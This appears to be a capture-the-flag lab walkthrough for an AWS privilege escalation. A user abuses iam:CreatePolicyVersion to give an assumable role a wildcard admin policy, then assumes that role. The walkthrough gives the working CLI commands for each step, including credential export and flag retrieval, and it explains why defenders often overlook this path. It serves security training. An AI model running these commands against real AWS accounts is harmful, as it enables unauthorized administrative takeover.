# Guided Walkthrough: Privilege Escalation via iam:CreatePolicyVersion + sts:AssumeRole

This scenario demonstrates a subtle privilege escalation vulnerability where a user has permission to create new versions of a customer-managed IAM policy that is attached to a privileged role. Unlike modifying inline policies or attaching managed policies, this technique exploits AWS's policy versioning feature where new versions automatically become the default.

The attacker starts with `iam:CreatePolicyVersion` permission on a customer-managed policy attached to a target role. By creating a new policy version with administrative permissions, the attacker can effectively grant the role admin access without needing `iam:AttachRolePolicy` or `iam:PutRolePolicy` permissions. Once the policy is modified, the attacker assumes the now-privileged role to gain full administrator access.

This is particularly dangerous because policy version modifications are often overlooked in security monitoring, and many organizations don't realize that `iam:CreatePolicyVersion` can be as dangerous as direct policy attachment permissions. The technique also demonstrates lateral movement from a user principal to a role principal through policy manipulation.

## The Challenge

You start as `pl-prod-iam-016-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. This user has two key permissions: `iam:CreatePolicyVersion` on the customer-managed policy `pl-prod-iam-016-to-admin-target-policy`, and `sts:AssumeRole` on the role `pl-prod-iam-016-to-admin-target-role`. The role has that customer-managed policy attached, but currently the policy only grants minimal permissions. Your goal is to reach full administrative control over the AWS account.

## Reconnaissance

First, let's confirm our identity and verify that we can't do anything privileged yet.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# => arn:aws:iam::{account_id}:user/pl-prod-iam-016-to-admin-starting-user

aws iam list-users --max-items 1
# => AccessDenied (as expected -- we have no admin permissions yet)
```

Now let's look at the target policy to understand what we're working with. The helpful `iam:GetPolicy` and `iam:ListPolicyVersions` permissions let us inspect it:

```bash
# Get the policy ARN from Terraform outputs, then inspect it
aws iam get-policy \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-016-to-admin-target-policy \
  --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' \
  --output table

aws iam list-policy-versions \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-016-to-admin-target-policy \
  --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' \
  --output table
```

There's only one version (v1) and it is the default. Let's read the actual policy document:

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-016-to-admin-target-policy \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

The current document only grants minimal permissions -- nothing that reaches admin. But we have `iam:CreatePolicyVersion` on this policy, and it is attached to a role we can assume. That's the path.

## Exploitation

### Step 1: Create a new policy version with administrative permissions

AWS customer-managed policies support up to five versions. When you create a new version with `--set-as-default`, it immediately becomes the active version for all principals that have the policy attached -- no detach/reattach required.

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-016-to-admin-target-policy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

The response confirms that v2 was created and set as default. The target role now has `Action: "*"` on `Resource: "*"` via this policy.

### Step 2: Wait for IAM propagation

IAM policy changes propagate across AWS infrastructure within seconds, but it is good practice to wait 15 seconds before attempting to use the new permissions.

```bash
sleep 15
```

### Step 3: Assume the now-privileged role

The trust policy on `pl-prod-iam-016-to-admin-target-role` already allows our starting user to assume it. Now that the attached policy grants AdministratorAccess, assuming the role gives us full admin credentials.

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-016-to-admin-target-role \
  --role-session-name privesc-session \
  --query 'Credentials' \
  --output json
```

Export the returned `AccessKeyId`, `SecretAccessKey`, and `SessionToken` into your environment:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

## Verification

With the role's credentials active, try listing IAM users -- a privileged action that would have failed before:

```bash
aws iam list-users --max-items 3 --output table
```

Success. You now have full administrative access to the AWS account.

```bash
aws sts get-caller-identity
# => arn:aws:iam::{account_id}:assumed-role/pl-prod-iam-016-to-admin-target-role/privesc-session
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the assumed target role provides implicitly via its AdministratorAccess policy.

With the assumed role's credentials still active in your environment (the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` you exported in the previous step), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-016-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a privilege escalation path that many security teams overlook: `iam:CreatePolicyVersion` on a customer-managed policy. Rather than directly attaching a new policy or modifying a role's inline policy -- operations that security controls commonly watch -- you created a new *version* of an existing policy. AWS policy versioning is designed as a rollback mechanism, but it doubles as a privilege escalation vector when granted to non-administrators.

The complete attack chain was:

```
pl-prod-iam-016-to-admin-starting-user
  → iam:CreatePolicyVersion (on target-policy, sets new v2 as default with Action:*/Resource:*)
  → target-policy now grants AdministratorAccess to target-role
  → sts:AssumeRole (on target-role)
  → pl-prod-iam-016-to-admin-target-role (full admin)
```

In real environments this pattern appears when developers or CI/CD pipelines are granted modify access to specific customer-managed policies without the security team realising that `iam:CreatePolicyVersion` is functionally equivalent to granting the ability to write any permissions to any principal that uses the policy.
